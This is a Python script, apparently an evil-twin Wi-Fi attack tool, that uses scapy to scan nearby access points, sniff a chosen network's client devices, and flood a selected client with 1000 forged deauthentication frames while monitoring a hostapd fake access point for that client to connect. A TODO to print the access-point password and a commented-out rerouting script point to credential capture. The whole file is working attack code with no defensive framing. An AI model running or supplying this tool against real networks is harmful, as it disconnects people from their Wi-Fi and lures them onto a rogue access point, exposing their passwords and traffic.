from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.config import conf
from threading import Thread
import pandas
import time
import pdb
import os
from loguru import logger
from subprocess import run
from simple_term_menu import TerminalMenu

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

isSniffing = True
isPrinting = True
check_fake_ap_connections = True

bssid_to_scan = ''
clients = set()

# check for connection on the fake ap
def check_for_connection():
    conn = []
    while check_fake_ap_connections:
        out = run("systemctl status hostapd | grep \"starting accounting session\"", capture_output=True, shell=True, text=True).stdout
        for line in out.splitlines():
            client_mac = line.split()[7]
            if client_mac not in conn:
                conn.append(client_mac)
                logger.info(f"\n{client_mac} Client connected!")
        time.sleep(1)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except Exception as e:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_APs():
    while isPrinting:
        os.system("clear")
        logger.info("Start scanning networks...")
        print(networks)
        time.sleep(0.5)


def print_scanned_clients():
    while True:
        os.system("clear")
        print(clients)
        time.sleep(1)


def change_channel():
    ch = 1
    while isSniffing:
        os.system(f"iwconfig {conf.iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


def get_AP_clients(pkt):
    valid_bssid = [bssid_to_scan]
    if pkt.haslayer(Dot11) and pkt.type == 2:
        client_mac = None
        DS = pkt.FCfield & 0x3
        to_ds = DS & 0x01 != 0
        from_ds = DS & 0x2 != 0
        # print (f"pkt[Dot11].FCfield: {pkt[Dot11].FCfield}")
        # print (f"from_ds: {from_ds}, to_ds: {to_ds}")
        # print (f"pkt.addr1: {pkt.addr1}, pkt.addr2: {pkt.addr2}, pkt.addr3: {pkt.addr3}")
        if to_ds and not from_ds and pkt.addr1 in valid_bssid:
            client_mac = pkt.addr2
        elif from_ds and not to_ds and pkt.addr2 in valid_bssid:
            client_mac = pkt.addr3
        elif not from_ds and not to_ds and pkt.addr1 in valid_bssid:
            client_mac = pkt.addr2

        if client_mac:
            clients.add(client_mac)


def deauth_target(target_mac, twin_mac):
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=twin_mac, addr3=twin_mac)
    pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(pkt, inter=0.1, count=1000, iface=conf.iface, verbose=1)


if __name__ == "__main__":

    conf.iface = os.getenv("ATTACK_INTERFACE")
    logger.info(f"using interface: {conf.iface}")

    # start the thread that prints all the networks
    printer = Thread(target=print_APs)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, monitor=True, timeout=10)
    isPrinting = False

    logger.info("Please choose a network (SSID) to scan clients from: ")

    ssid_to_scan = input()
    bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]

    logger.info(f'Start scanning clients on \"{ssid_to_scan}\" {bssid_to_scan}')
    sniff(prn=get_AP_clients, monitor=True, timeout=20)
    isSniffing = False # for the change_channel thread

    
    # os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")

    # start the thread that prints all the connected clients
    printer = Thread(target=check_for_connection)
    printer.daemon = True
    printer.start()

    logger.info("please choose a client MAC to deauth: ")
    # clients set to list 
    clients = list(clients)
    terminal_menu = TerminalMenu(clients)
    choice_index = terminal_menu.show()
    target_mac = clients[choice_index]

    deauth_target(target_mac, bssid_to_scan)

    check_fake_ap_connections = False

    # TODO: print the ap password
    

    # pdb.set_trace()